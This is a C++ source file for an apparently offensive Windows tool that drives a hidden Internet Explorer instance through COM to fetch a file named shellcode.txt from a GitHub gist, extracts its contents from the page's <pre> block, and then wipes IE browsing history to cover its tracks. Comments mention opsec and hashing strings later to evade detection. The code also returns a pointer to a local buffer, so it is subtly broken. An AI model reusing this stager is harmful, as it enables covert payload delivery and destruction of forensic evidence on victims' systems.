#include<Windows.h>
#include<stdio.h>
#include <objbase.h>
#include<combaseapi.h>
#include <exdisp.h>
#include <mshtml.h>
#include <Urlhist.h>


#pragma comment(lib, "Ole32.lib")
#pragma comment(lib, "OleAut32.lib")

// Manually adding CUrlHistory GUID
const IID CLSID_CUrlHistory = { 0x3C374A40L, 0xBAE4, 0x11CF, 0xBF, 0x7D, 0x00, 0xAA, 0x00, 0x69, 0x46, 0xEE };


int history_cleanup() {

	// Delete IE browser history
	IUrlHistoryStg2* pIEHistory;


	HRESULT hr = CoCreateInstance(CLSID_CUrlHistory, NULL, CLSCTX_INPROC, IID_PPV_ARGS(&pIEHistory));

	if (SUCCEEDED(hr)) {
		pIEHistory->ClearHistory();
		pIEHistory->Release();
	}


	return 0;
}





// BSTR to Char conversion function:
char* BSTRtoChar(BSTR String)
{
	int n, i;
	char* FinalChar;
	n = SysStringLen(String); // length of input
	FinalChar = (char*)malloc(n + 1);
	for (i = 0; i < n; i++)
	{
		FinalChar[i] = (char)String[i];
	}
	FinalChar[i] = 0;
	return FinalChar;
}


char * download() {

	// Disable IE First-use prompt 


	// we need clsid since we are doing COM 
	CLSID clsid;


	// Initialize COM library
	CoInitialize(NULL);

	// Get clsid from ProgramID
	// Makesure to Hash the "internetexplorer.app" string out later
	if (CLSIDFromProgID(OLESTR("InternetExplorer.Application"), &clsid) != S_OK) {

		// Handle errors reading COM error handling pattern
		printf("IE COM Initialization Failed\n");
	}
	else {

		printf("IE COM Initialization Success\n");
	}

	LPOLESTR pszTerminalCLSID = NULL;
	HRESULT hr = StringFromCLSID(clsid, &pszTerminalCLSID);
	printf("IE CLSID ?:  %ws\n", pszTerminalCLSID);

	// We have a valid ClassID for IE now ?

	// Create instance of IE
	IWebBrowser2* webBrowserPtr;
	LPUNKNOWN pUnknown = NULL;
	VARIANT var;
	VARIANT_BOOL vBusy;
	IDispatch* pDispatch = NULL;
	IHTMLDocument2* pHTML = NULL;


	if (CoCreateInstance(clsid, NULL, CLSCTX_LOCAL_SERVER, IID_IWebBrowser2, (LPVOID*)&pUnknown) != S_OK) {

		printf("Error\n");
	}


	pUnknown->QueryInterface(IID_IWebBrowser2, (LPVOID*)&webBrowserPtr);
	pUnknown->Release();



	OLECHAR test[] = L"https://gist.githubusercontent.com/pwn1sher/7b837de56493248c78873609ef51fba6/raw/8e30a5ca4da92251ded2db222f7195a637b64ac7/shellcode.txt";

	// 2. navigate to URL
	BSTR bstrUrl = SysAllocString(test);
	var.vt = VT_I4; // 4 byte signed int
	var.lVal = 0;

	// Change it to FALSE Later for opsec
	if (webBrowserPtr->put_Visible(VARIANT_FALSE) != S_OK) {
		printf("Failed to put visiblity false\n");
	}


	printf("Opening URL: %ws\n", test);


	// Visit the URL!
	webBrowserPtr->Navigate(bstrUrl, &var, &var, &var, &var);
	SysFreeString(bstrUrl);


	// Wait to load fully
	do
	{
		Sleep(1);
		webBrowserPtr->get_Busy(&vBusy);
	} while (vBusy);


	// additional sleep
	Sleep(2000);


	// Get the HTML
	HRESULT htmldoc = webBrowserPtr->get_Document(&pDispatch);
	pDispatch->QueryInterface(IID_IHTMLDocument2, (LPVOID*)&pHTML);
	pDispatch->Release();

	// 5. print the <title>
	pHTML->get_title(&bstrUrl);
	printf("Title: %ws\n", bstrUrl);

	IHTMLElement* lpBodyElm;
	HRESULT hrGetBody = pHTML->get_body(&lpBodyElm);

	// Get IHTMLElement HTML Parent element
	IHTMLElement* lpParentElm;
	HRESULT hrGetParElm = lpBodyElm->get_parentElement(&lpParentElm);

	// Get Inner HTML content as a binary string
	BSTR bstrBody;
	HRESULT hrGetInrHTMl = lpParentElm->get_innerHTML(&bstrBody);



	char* p2str;
	char* body;
	body = BSTRtoChar(bstrBody);


	char s2[] = "<pre>";

	char* p1, * p2, * p3;
	p1 = strstr(body, "<pre>");

	//printf("SS %s\n", p1);

	char out[1024];


	if (p1) {
		p2 = strstr(p1, "</pre>");
		if (p2) sprintf_s(out, "%.*s", int(p2 - p1 - 5), p1 + 5);
		printf("huh: %s\n\n\n", out);
	}



	// Delete IE History
	history_cleanup();

	//CleanUp
	SysFreeString(bstrUrl);
	webBrowserPtr->Quit();
	webBrowserPtr->Release();
	pHTML->Release();
	CoUninitialize();


	return out;
}